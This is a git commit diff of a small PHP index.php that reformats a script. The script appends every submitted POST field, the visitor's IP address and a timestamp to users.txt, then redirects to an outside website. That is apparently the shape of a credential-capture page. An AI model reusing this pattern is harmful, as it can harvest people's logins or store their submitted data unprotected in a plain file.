586336ef3696062b5ba0aacc5f82066018521efd
Jayson Zabate <asdjsonyou@users.noreply.github.com>
2015-02-19 05:30:59 -0800

    Update index.php

--- index.php
+++ index.php
@@ -1,18 +1,27 @@
-
 <?php
-/* Writing the time/date and Ip address to a file */
-$handle = fopen('users.txt', 'a');
 
-foreach($_POST as $variable => $value) {
-    fwrite($handle, $variable . '=' . $value . PHP_EOL);
-}
+/**
+ * Writing the time and date 
+ * Writing the IP ADDRESS to a file 
+ */
+ $handle = fopen('users.txt', 'a');
 
-/* Grabbing the REMOTE IP ADDRESS and Logging the time and date */
-fwrite($handle, 'REMOTE IP ADDRESS: ' . $_SERVER['REMOTE_ADDR'] . $time = date(" l F dS h:i A Y") . PHP_EOL);
-fclose($handle);
+ foreach($_POST as $variable => $value) {
+     fwrite($handle, $variable . '=' . $value . PHP_EOL);
+ }
 
-/* Redirectng to a different page */
-header('Location: http://jaysonzabate.com/');
-exit;
+/** 
+ * Grabbing the REMOTE IP ADDRESS 
+ * Logging the time and date 
+ */
+ fwrite($handle, 'REMOTE IP ADDRESS: ' . $_SERVER['REMOTE_ADDR'] . $time = date(" l F dS h:i A Y") . PHP_EOL);
+ fclose($handle);
+
+/**
+ * Redirectng to a different page 
+ */
+ header('Location: http://jaysonzabate.com/');
+ exit;
+
 
 
